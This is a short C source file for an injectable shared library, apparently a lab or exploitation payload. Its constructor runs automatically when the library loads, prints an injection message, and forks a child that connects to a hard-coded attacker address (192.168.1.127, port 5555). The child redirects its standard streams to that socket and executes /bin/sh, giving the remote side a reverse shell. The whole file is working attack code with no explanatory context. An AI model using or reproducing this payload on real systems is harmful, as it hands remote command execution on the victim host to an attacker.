#include <stdio.h>
#include <stdlib.h>
#include <syslog.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define ATTACKER_IP "192.168.1.127"
#define ATTACKER_PORT 5555

__attribute__((constructor))
static void init()
{
    printf("Library successfully injected!\n");
    syslog(LOG_CRIT, "Library called\n");
    
    //Just a sample reverse shell (https://www.revshells.com/)
    pid_t pid = fork();
    if(pid==0){
        int port = ATTACKER_PORT;
        struct sockaddr_in revsockaddr;

        int sockt = socket(AF_INET, SOCK_STREAM, 0);
        revsockaddr.sin_family = AF_INET;       
        revsockaddr.sin_port = htons(port);
        revsockaddr.sin_addr.s_addr = inet_addr(ATTACKER_IP);

        connect(sockt, (struct sockaddr *) &revsockaddr, 
        sizeof(revsockaddr));
        dup2(sockt, 0);
        dup2(sockt, 1);
        dup2(sockt, 2);

        char * const argv[] = {"/bin/sh", NULL};
        execve("/bin/sh", argv, NULL);
    }
}